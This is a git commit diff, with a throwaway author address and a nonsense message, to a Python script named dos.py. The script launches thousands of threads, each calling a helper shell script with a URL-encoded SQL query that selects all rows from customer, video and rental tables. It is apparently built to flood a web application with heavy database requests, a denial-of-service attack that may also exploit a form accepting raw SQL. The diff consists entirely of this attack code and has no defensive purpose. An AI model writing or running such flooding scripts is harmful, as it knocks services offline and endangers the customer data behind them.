dda438a77b66d85be52c5d809d8b22701acd92c4
DaineMuddah <faker69x@trash-mail.de>
2017-12-10 17:47:17 +0100

    dffsdfsdfsdfds

--- dos.py
+++ dos.py
@@ -6,18 +6,18 @@ import time
 SQL_QUERY = "sql_abfrage=SELECT+*+FROM+kunden%2C+videos%2C+ausleihe+WHERE+ausleihe.kunr+LIKE+%27%25{}%25%27+GROUP+BY+kunden.kustras++ORDER+BY+kunden.kuort&domain=Geschaeftsfuehrung&num=0&limit=10000&submit=Query+abschicken%21"
 
 def execx():
-    call(["./vcenter.sh", SQL_QUERY.format(randint(0, 200))])
+    call(["./vcenter.sh", SQL_QUERY.format(randint(0, 2000))])
 
 t = []
 
-for y in range(1, 10):
-	for i in range(1,1000):
+for y in range(1, 10000):
+	for i in range(1,10):
 		x = Thread(target=execx)
 		t.append(x)
 		x.start()
 	for x in t:
 		x.join()
 
-	print("10.000 Threads finished")
+	print("10 Threads finished")
 
 
